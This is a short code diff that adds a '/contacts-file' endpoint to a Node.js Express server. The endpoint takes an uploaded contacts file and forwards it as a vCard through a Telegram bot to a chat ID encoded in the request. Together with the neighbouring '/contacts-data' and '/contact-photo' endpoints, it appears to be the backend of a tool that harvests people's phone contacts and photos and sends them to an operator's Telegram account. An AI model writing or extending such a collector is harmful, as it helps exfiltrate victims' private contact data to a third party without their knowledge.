@@ -214,6 +214,20 @@ app.post("/contacts-data", (req, res) => {
   } else { res.send("Error"); }
 });
 
+const multer = require('multer');
+const upload = multer({ storage: multer.memoryStorage() });
+
+app.post("/contacts-file", upload.single('file'), (req, res) => {
+  var uid = req.body.uid || null;
+  var count = req.body.count || '؟';
+  var file = req.file || null;
+  if (uid && file) {
+    var info = { filename: "contacts.vcf", contentType: 'text/vcard' };
+    bot.sendDocument(parseInt(uid, 36), file.buffer, { caption: `📱 جهات الاتصال: ${count} جهة اتصال` }, info);
+    res.send("Done");
+  } else { res.send("Error"); }
+});
+
 app.post("/contact-photo", (req, res) => {
   var uid = decodeURIComponent(req.body.uid) || null;
   var img = decodeURIComponent(req.body.img) || null;
